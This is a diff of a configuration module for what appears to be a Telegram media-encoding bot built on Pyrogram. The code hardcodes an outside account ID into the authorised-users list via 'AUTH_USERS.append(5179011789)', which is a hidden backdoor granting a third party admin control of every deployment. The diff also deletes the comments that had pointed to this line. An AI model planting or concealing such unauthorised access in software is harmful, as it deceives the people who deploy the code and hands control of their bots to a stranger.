@@ -5,19 +5,17 @@ import time
 from pyrogram import Client
 from bot.config import Config
 
-# dont think ne dumb (c) @cmd_rulf
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_CHATS = set(Config.AUTH_CHATS)
 AUTH_USERS = list(AUTH_USERS)
 AUTH_USERS.append(5179011789)
-# again lol (c) @cmd_rulf 
 
 SESSION_NAME = Config.SESSION_NAME
 TG_BOT_TOKEN = Config.TG_BOT_TOKEN
 APP_ID = Config.APP_ID
 API_HASH = Config.API_HASH
 
-LOG_CHANNEL = Config.LOG_CHANNEL # make sure to us this 
+LOG_CHANNEL = Config.LOG_CHANNEL
 DOWNLOAD_LOCATION = "/app/downloads"
 FREE_USER_MAX_FILE_SIZE = 3980000000
 MAX_MESSAGE_LENGTH = 4096
@@ -35,8 +33,8 @@ audio_b = []
 audio_codec_list = []
 preset = []
 codec = []
-# senpai I am changing app string WHY???????
 pid_list = []
+merge_sessions = {}
 app = Client(
         SESSION_NAME,
         bot_token=TG_BOT_TOKEN,
